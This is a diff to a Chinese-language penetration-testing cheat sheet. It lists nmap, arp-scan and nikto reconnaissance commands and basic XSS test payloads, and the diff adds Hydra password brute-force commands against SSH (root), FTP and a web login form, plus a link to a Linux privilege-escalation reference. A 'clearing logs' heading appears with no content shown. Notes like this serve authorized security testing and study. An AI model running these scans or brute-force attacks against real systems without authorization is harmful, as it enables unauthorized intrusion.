@@ -7,6 +7,7 @@
 主動情報收集
 連接埠掃描與服務識別
 - nmap -sV -sC -O -p- -T4 --min-rate 5000 [目標IP] -oN scan_result.txt
+- nmap -sS -A -p- [目標IP]
 - arp-scan -l -> 掃描區域網路內所有設備的 MAC 與 IP 位址。
 - nikto -host http://target.com/ -> 自動找常見 Web 漏洞
 
@@ -38,6 +39,18 @@ DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
 - <a href="javascript:alert(1)">g</a>
 - <input type="text" value="g" onmouseover="alert(1)" />
 - <iframe src="javascript:alert(1)"></iframe>
+
+3. Hydra -> /usr/share/wordlists
+(1) SSH
+hydra -l root -P passwords.txt 192.168.1.1 ssh
+(2) FTP
+hydra -L users.txt -P passwords.txt -t 4 192.168.1.50 ftp
+(3) 網頁表單
+hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"
+
+Linux 提權
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
+
 
 ## 清除紀錄
 
